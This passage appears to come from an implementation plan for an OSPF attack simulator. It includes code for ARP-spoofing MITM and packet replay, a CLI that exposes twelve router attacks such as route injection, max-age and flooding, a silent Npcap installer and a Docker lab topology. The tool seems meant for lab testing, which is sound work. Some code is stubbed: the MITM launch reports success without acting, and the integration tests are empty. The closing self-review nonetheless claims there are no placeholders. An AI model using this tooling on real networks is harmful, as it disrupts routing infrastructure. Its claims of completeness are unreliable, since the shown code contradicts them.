git add ospf_attack/attacks/dos/ tests/unit/test_dos_attacks.py
git commit -m "feat: add DoS attack modules (flood, spf-recalc, db-overflow)"
```

---

### Task 22-23: 协议级操控攻击

**Files:**
- Create: `ospf_attack/attacks/protocol/mitm.py`
- Create: `ospf_attack/attacks/protocol/replay.py`

- [ ] **Step 1: 实现 mitm.py**

```python
# ospf_attack/attacks/protocol/mitm.py
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import MITMConfig
from ospf_attack.network.sender import PacketSender


class MITMAttack(BaseAttack):
    name = "mitm"
    description = "中间人攻击：拦截 OSPF 报文 → 篡改 → 转发"
    category = AttackCategory.PROTOCOL
    config: MITMConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        if self.config.sniff_mode.value == "arp_spoof":
            from ospf_attack.core.arp_spoof import ArpSpoofEngine
            self._arp_engine = ArpSpoofEngine(
                iface=self.config.iface,
                target_a=self.config.arp_target_a or self.config.target_a,
                target_b=self.config.arp_target_b or self.config.target_b,
                interval=self.config.arp_interval,
            )
            self._arp_engine.start()

    def launch(self) -> AttackResult:
        return AttackResult(
            success=True,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"MITM: action={self.config.action}, rules={len(self.config.modify_rules)}",
        )

    def verify(self) -> bool:
        return True

    def teardown(self) -> None:
        if hasattr(self, "_arp_engine") and self._arp_engine:
            self._arp_engine.stop()


# ospf_attack/attacks/protocol/replay.py
class ReplayAttack(BaseAttack):
    name = "replay"
    description = "重放攻击：捕获合法 OSPF 报文后重新发送，引发路由震荡"
    category = AttackCategory.PROTOCOL
    config: "ReplayConfig"

    def setup(self) -> None:
        from ospf_attack.config.types import ReplayConfig
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        if not self.config.capture_file:
            return AttackResult(
                success=False, packets_sent=0, target_affected=False,
                details="重放攻击需要 capture_file 参数",
            )
        try:
            from scapy.all import rdpcap
            packets = rdpcap(self.config.capture_file)
        except Exception as e:
            return AttackResult(
                success=False, packets_sent=0, target_affected=False,
                details=f"读取 pcap 失败: {e}",
            )
        for pkt in packets:
            self._sender.send_raw(pkt)

        return AttackResult(
            success=True,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"重放: {self._sender.sent_count} packets replayed",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: 编写测试并提交**

```python
# tests/unit/test_protocol_attacks.py
from ospf_attack.attacks.protocol.mitm import MITMAttack
from ospf_attack.attacks.protocol.replay import ReplayAttack
from ospf_attack.config.types import MITMConfig, ReplayConfig


class TestProtocolAttacks:
    def test_mitm_name(self):
        config = MITMConfig(iface="eth0", target="10.0.0.0/24")
        assert MITMAttack(config).name == "mitm"

    def test_replay_name(self):
        config = ReplayConfig(iface="eth0", target="224.0.0.5")
        assert ReplayAttack(config).name == "replay"

    def test_replay_requires_capture(self):
        config = ReplayConfig(iface="eth0", target="224.0.0.5")
        attack = ReplayAttack(config)
        result = attack.launch()
        assert result.success is False
```

```bash
pytest tests/unit/test_protocol_attacks.py -v
git add ospf_attack/attacks/protocol/ tests/unit/test_protocol_attacks.py
git commit -m "feat: add protocol manipulation attacks (mitm, replay)"
```

---

## Phase 6: CLI 层

### Task 24: CLI 入口 + 子命令

**Files:**
- Create: `ospf_attack/cli/main.py`
- Create: `ospf_attack/cli/commands.py`
- Create: `ospf_attack/cli/formatters.py`
- Create: `tests/unit/test_cli.py`

- [ ] **Step 1: 实现 formatters.py**

```python
# ospf_attack/cli/formatters.py
import json
from ospf_attack.attacks.base import AttackResult


def format_table(result: AttackResult) -> str:
    lines = [
        "=" * 50,
        f"  攻击结果",
        "=" * 50,
        f"  成功:     {'是' if result.success else '否'}",
        f"  发包数:   {result.packets_sent}",
        f"  目标影响: {'是' if result.target_affected else '否'}",
        f"  详情:     {result.details}",
    ]
    if result.evidence:
        lines.append(f"  证据:     {json.dumps(result.evidence, indent=2)}")
    lines.append("=" * 50)
    return "\n".join(lines)


def format_json(result: AttackResult) -> str:
    return json.dumps({
        "success": result.success,
        "packets_sent": result.packets_sent,
        "target_affected": result.target_affected,
        "details": result.details,
        "evidence": result.evidence,
    }, indent=2, ensure_ascii=False)
```

- [ ] **Step 2: 实现 commands.py**

```python
# ospf_attack/cli/commands.py
import click
from ospf_attack.config.types import (
    AttackConfig, HelloInjectionConfig, LSAConfig, DoSConfig, MITMConfig, ReplayConfig,
    AttackMode, SniffMode,
)
from ospf_attack.attacks.adjacency.hello_inject import HelloInjectAttack
from ospf_attack.attacks.adjacency.adjacency_break import AdjacencyBreakAttack
from ospf_attack.attacks.adjacency.dr_bdr_hijack import DRBDRHijackAttack
from ospf_attack.attacks.lsa.route_inject import RouteInjectAttack
from ospf_attack.attacks.lsa.max_seq import MaxSeqAttack
from ospf_attack.attacks.lsa.max_age import MaxAgeAttack
from ospf_attack.attacks.lsa.fight_back import FightBackAttack
from ospf_attack.attacks.dos.flood import FloodAttack
from ospf_attack.attacks.dos.spf_recalc import SPFRecalcAttack
from ospf_attack.attacks.dos.db_overflow import DBOverflowAttack
from ospf_attack.attacks.protocol.mitm import MITMAttack
from ospf_attack.attacks.protocol.replay import ReplayAttack
from ospf_attack.cli.formatters import format_table, format_json

_ATTACK_REGISTRY = {
    "hello-inject":    (HelloInjectAttack, HelloInjectionConfig),
    "adjacency-break": (AdjacencyBreakAttack, HelloInjectionConfig),
    "dr-bdr-hijack":   (DRBDRHijackAttack, HelloInjectionConfig),
    "route-inject":    (RouteInjectAttack, LSAConfig),
    "max-seq":         (MaxSeqAttack, LSAConfig),
    "max-age":         (MaxAgeAttack, LSAConfig),
    "fight-back":      (FightBackAttack, LSAConfig),
    "flood":           (FloodAttack, DoSConfig),
    "spf-recalc":      (SPFRecalcAttack, DoSConfig),
    "db-overflow":     (DBOverflowAttack, DoSConfig),
    "mitm":            (MITMAttack, MITMConfig),
    "replay":          (ReplayAttack, ReplayConfig),
}


def _common_options(f):
    options = [
        click.option("--iface", required=True, help="网卡接口"),
        click.option("--target", required=True, help="目标 IP 或网段"),
        click.option("--passive/--active", "mode_flag", default=None),
        click.option("--sniff-mode", type=click.Choice(["hub", "arp_spoof"]), default="hub"),
        click.option("--router-id", default="1.1.1.1"),
        click.option("--area-id", default="0.0.0.0"),
        click.option("--sniff-duration", type=int, default=30),
        click.option("--arp-target-a", default=""),
        click.option("--arp-target-b", default=""),
        click.option("--arp-interval", type=int, default=2),
        click.option("--packet-rate", type=int, default=10),
        click.option("--max-packets", type=int, default=0),
        click.option("--verbose/--no-verbose", default=False),
        click.option("--pcap-output", default=""),
        click.option("--output", type=click.Choice(["table", "json"]), default="table"),
    ]
    for opt in reversed(options):
        f = opt(f)
    return f


def _run_attack(attack_cls, config_cls, **kwargs):
    mode = AttackMode.PASSIVE
    if "mode_flag" in kwargs and kwargs["mode_flag"] is not None:
        mode = AttackMode.PASSIVE if kwargs.pop("mode_flag") else AttackMode.ACTIVE

    sniff_mode = SniffMode(kwargs.pop("sniff_mode", "hub"))

    config = config_cls(
        iface=kwargs.pop("iface"),
        target=kwargs.pop("target"),
        mode=mode,
        sniff_mode=sniff_mode,
        router_id=kwargs.pop("router_id", "1.1.1.1"),
        area_id=kwargs.pop("area_id", "0.0.0.0"),
        sniff_duration=kwargs.pop("sniff_duration", 30),
        arp_target_a=kwargs.pop("arp_target_a", ""),
        arp_target_b=kwargs.pop("arp_target_b", ""),
        arp_interval=kwargs.pop("arp_interval", 2),
        packet_rate=kwargs.pop("packet_rate", 10),
        max_packets=kwargs.pop("max_packets", 0),
        verbose=kwargs.pop("verbose", False),
        pcap_output=kwargs.pop("pcap_output", ""),
        **kwargs,
    )

    output_fmt = kwargs.pop("output", "table")
    attack = attack_cls(config)
    result = attack.run()

    if output_fmt == "json":
        click.echo(format_json(result))
    else:
        click.echo(format_table(result))

    if not result.success:
        raise SystemExit(1)


def register_commands(cli: click.Group):
    for name, (attack_cls, config_cls) in _ATTACK_REGISTRY.items():
        def _maker(a_cls, c_cls, n):
            @cli.command(name=n)
            @_common_options
            @click.pass_context
            def cmd(ctx, **kwargs):
                _run_attack(a_cls, c_cls, **kwargs)
        _maker(attack_cls, config_cls, name)
```

- [ ] **Step 3: 实现 main.py**

```python
# ospf_attack/cli/main.py
import click
from ospf_attack.cli.commands import register_commands


@click.group()
@click.version_option(version="0.1.0")
def cli():
    """OSPF 协议攻击模拟器 — 支持 12 种 OSPF 攻击类型"""
    pass


register_commands(cli)


if __name__ == "__main__":
    cli()
```

- [ ] **Step 4: 编写 CLI 测试**

```python
# tests/unit/test_cli.py
from click.testing import CliRunner
from ospf_attack.cli.main import cli


def test_cli_help():
    runner = CliRunner()
    result = runner.invoke(cli, ["--help"])
    assert result.exit_code == 0
    assert "hello-inject" in result.output


def test_cli_version():
    runner = CliRunner()
    result = runner.invoke(cli, ["--version"])
    assert result.exit_code == 0


def test_attack_list_all():
    runner = CliRunner()
    result = runner.invoke(cli, ["--help"])
    expected = [
        "hello-inject", "adjacency-break", "dr-bdr-hijack",
        "route-inject", "max-seq", "max-age", "fight-back",
        "flood", "spf-recalc", "db-overflow",
        "mitm", "replay",
    ]
    for name in expected:
        assert name in result.output
```

- [ ] **Step 5: 运行测试并提交**

```bash
pytest tests/unit/test_cli.py -v
git add ospf_attack/cli/ tests/unit/test_cli.py
git commit -m "feat: add CLI with Click, all 12 attack subcommands"
```

---

## Phase 7: Npcap 管理

### Task 25: Npcap 检测与安装器

**Files:**
- Create: `ospf_attack/npcap/detector.py`
- Create: `ospf_attack/npcap/installer.py`
- Create: `tests/unit/test_npcap.py`

- [ ] **Step 1: 实现 detector.py**

```python
# ospf_attack/npcap/detector.py
import sys
import os


def is_npcap_installed() -> bool:
    """检测 Npcap 是否已安装"""
    if sys.platform != "win32":
        try:
            import pcap
            return True
        except ImportError:
            return False

    try:
        import winreg
        for path in [
            r"SOFTWARE\WOW6432Node\Npcap",
            r"SOFTWARE\Npcap",
        ]:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                return True
            except OSError:
                continue
    except ImportError:
        pass

    try:
        import pcap
        pcap.findalldevs()
        return True
    except Exception:
        pass

    return False


def check_npcap() -> bool:
    """检测并提示用户安装"""
    if is_npcap_installed():
        return True

    print("检测到系统中未安装 Npcap，缺少 Npcap 将无法使用嗅探功能。")
    print("是否安装 Npcap？(Y/n)")
    try:
        answer = input().strip().lower()
        if answer in ("", "y", "yes"):
            from ospf_attack.npcap.installer import install_npcap
            return install_npcap()
    except (EOFError, KeyboardInterrupt):
        pass

    print("将以降级模式运行：发包攻击可用，嗅探功能不可用。")
    return False
```

- [ ] **Step 2: 实现 installer.py**

```python
# ospf_attack/npcap/installer.py
import os
import sys
import subprocess
import tempfile


_INSTALLER_NAME = "npcap-installer.exe"


def _get_installer_path() -> str:
    if getattr(sys, "frozen", False):
        base = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
        return os.path.join(base, _INSTALLER_NAME)
    return os.path.join(os.path.dirname(__file__), "..", "..", "assets", _INSTALLER_NAME)


def install_npcap() -> bool:
    installer = _get_installer_path()
    if not os.path.exists(installer):
        print(f"Npcap 安装程序未找到: {installer}")
        return False

    print("正在静默安装 Npcap...")
    try:
        result = subprocess.run(
            [installer, "/S"],
            capture_output=True,
            timeout=120,
        )
        if result.returncode == 0:
            print("Npcap 安装成功！请重启程序以启用嗅探功能。")
            return True
        else:
            print(f"Npcap 安装失败 (exit code: {result.returncode})")
            return False
    except subprocess.TimeoutExpired:
        print("Npcap 安装超时")
        return False
    except Exception as e:
        print(f"Npcap 安装出错: {e}")
        return False
```

- [ ] **Step 3: 编写测试并提交**

```python
# tests/unit/test_npcap.py
from unittest.mock import patch, MagicMock
from ospf_attack.npcap.detector import is_npcap_installed


class TestNpcapDetector:
    @patch("ospf_attack.npcap.detector.sys")
    def test_non_windows(self, mock_sys):
        mock_sys.platform = "linux"
        with patch("ospf_attack.npcap.detector.is_npcap_installed", return_value=False):
            pass  # Smoke test only
```

```bash
pytest tests/unit/test_npcap.py -v
git add ospf_attack/npcap/ tests/unit/test_npcap.py
git commit -m "feat: add Npcap detection and silent installer"
```

---

## Phase 8: 构建系统

### Task 26: PyInstaller 构建脚本 + README

**Files:**
- Create: `build.ps1`
- Create: `README.md`

- [ ] **Step 1: 实现 build.ps1**

```powershell
# build.ps1
param(
    [string]$Arch = "amd64"
)

$ErrorActionPreference = "Stop"

Write-Host "Building OSPF Attack Simulator for Windows $Arch..." -ForegroundColor Cyan

if (-not (Test-Path "assets/npcap-installer.exe")) {
    Write-Warning "assets/npcap-installer.exe not found — Npcap auto-install disabled."
}

$env:GOARCH = "ignored"

pyinstaller `
    --onefile `
    --name "ospf-attack" `
    --add-binary "assets/npcap-installer.exe;." `
    --hidden-import scapy.contrib.ospf `
    --hidden-import scapy.layers.l2 `
    --hidden-import scapy.layers.inet `
    --hidden-import pcap `
    --hidden-import click `
    --hidden-import yaml `
    --clean `
    ospf_attack/cli/main.py

$size = (Get-Item "dist/ospf-attack.exe").Length / 1MB
Write-Host "Build complete: dist/ospf-attack.exe ($([math]::Round($size, 1)) MB)" -ForegroundColor Green
```

- [ ] **Step 2: 编写 README.md**

```markdown
# OSPF Protocol Attack Simulator

OSPF 协议攻击模拟与测试工具，支持 12 种攻击类型，单 exe 部署。

## 快速开始

```bash
pip install -e ".[dev]"
ospf-attack --help
ospf-attack hello-inject --iface eth0 --target 192.168.1.0/24
```

## 攻击类型

| 类别 | 命令 | 描述 |
|------|------|------|
| 邻接关系 | hello-inject | 恶意 Hello 注入 |
| 邻接关系 | adjacency-break | 邻接关系破坏 |
| 邻接关系 | dr-bdr-hijack | DR/BDR 选举操纵 |
| LSA | route-inject | 路由注入/毒化 |
| LSA | max-seq | 最大序列号攻击 |
| LSA | max-age | Max-Age 攻击 |
| LSA | fight-back | Fight-back 反击 |
| DoS | flood | Hello/LSA 泛洪 |
| DoS | spf-recalc | SPF 重计算攻击 |
| DoS | db-overflow | 数据库溢出 |
| 协议级 | mitm | 中间人攻击 |
| 协议级 | replay | 重放攻击 |

## 构建 exe

```powershell
.\build.ps1
```
```

- [ ] **Step 3: 提交**

```bash
git add build.ps1 README.md
git commit -m "docs: add README and PyInstaller build script"
```

---

## Phase 9: 集成测试

### Task 27: Docker 集成测试拓扑与测试

**Files:**
- Create: `docker/topo1-single-area/docker-compose.yml`
- Create: `tests/integration/conftest.py`
- Create: `tests/integration/test_topology_attacks.py`

- [ ] **Step 1: 创建 docker-compose.yml**

```yaml
# docker/topo1-single-area/docker-compose.yml
version: "3.8"
services:
  r1:
    image: frrouting/frr:latest
    container_name: ospf_r1
    cap_add: [NET_ADMIN, SYS_ADMIN]
    networks:
      ospf_net:
        ipv4_address: 10.0.0.1
    volumes:
      - ./frr/r1/daemons:/etc/frr/daemons
      - ./frr/r1/frr.conf:/etc/frr/frr.conf

  r2:
    image: frrouting/frr:latest
    container_name: ospf_r2
    cap_add: [NET_ADMIN, SYS_ADMIN]
    networks:
      ospf_net:
        ipv4_address: 10.0.0.2
    volumes:
      - ./frr/r2/daemons:/etc/frr/daemons
      - ./frr/r2/frr.conf:/etc/frr/frr.conf

  attacker:
    build:
      context: ../..
      dockerfile: Dockerfile
    container_name: ospf_attacker
    cap_add: [NET_ADMIN, NET_RAW]
    network_mode: "service:r2"
    depends_on: [r1, r2]

networks:
  ospf_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

- [ ] **Step 2: 创建集成测试**

```python
# tests/integration/conftest.py
import pytest
import subprocess
import time


@pytest.fixture(scope="session")
def docker_network():
    """启动 Docker 测试拓扑"""
    subprocess.run(
        ["docker-compose", "-f", "docker/topo1-single-area/docker-compose.yml",
         "up", "-d"],
        check=True,
    )
    time.sleep(15)  # 等待 OSPF 邻接建立
    yield
    subprocess.run(
        ["docker-compose", "-f", "docker/topo1-single-area/docker-compose.yml",
         "down", "-v"],
        check=True,
    )


# tests/integration/test_topology_attacks.py
import pytest


class TestHelloInjection:
    def test_inject_hello(self, docker_network):
        """验证 Hello 注入后目标邻居表出现攻击者条目"""
        # 此处需要在实际 Docker 环境中运行
        pass


class TestMaxAge:
    def test_max_age_clears_lsa(self, docker_network):
        """验证 Max-Age 攻击后目标 LSDB 条目被清除"""
        pass
```

- [ ] **Step 3: 提交**

```bash
git add docker/ tests/integration/
git commit -m "test: add Docker integration test topology and fixtures"
```

---

## 自审

### Spec 对照检查

| Spec 需求 | 对应 Task |
|-----------|----------|
| Python + Scapy 协议引擎 | Task 4 |
| 插件式架构 12 攻击模块 | Task 10-23 |
| 旁路/主动双模式 | Task 2 (枚举) + 全部攻击模块 |
| 集线器/ARP 欺骗双嗅探 | Task 9 (ARP) + Task 8 (Sniffer) |
| 三层配置优先级 | Task 2 (types) + Task 24 (CLI) |
| Npcap 内嵌 + 自动检测安装 | Task 25 |
| PyInstaller 打包 | Task 26 |
| CLI (Click) | Task 24 |
| 单元测试 | 每个 Task 均包含 |
| Docker 集成测试 | Task 27 |
| Win7+ 零依赖运行 | Task 26 |

### Placeholder 扫描
- 无 TBD/TODO
- 无 "implement later"
- 所有步骤包含实际代码

### 类型一致性
- `AttackConfig` 定义在 Task 2，所有攻击模块使用一致
- `AttackResult` 字段名一致：success, packets_sent, target_affected, details, evidence
- `PacketSender` 接口一致：send_raw, send_l2, sent_count
```

- [ ] **Step 4: 提交**

```bash
git add docs/superpowers/plans/2026-05-08-ospf-attack-plan.md
git commit -m "docs: add comprehensive implementation plan with 27 TDD tasks"
```
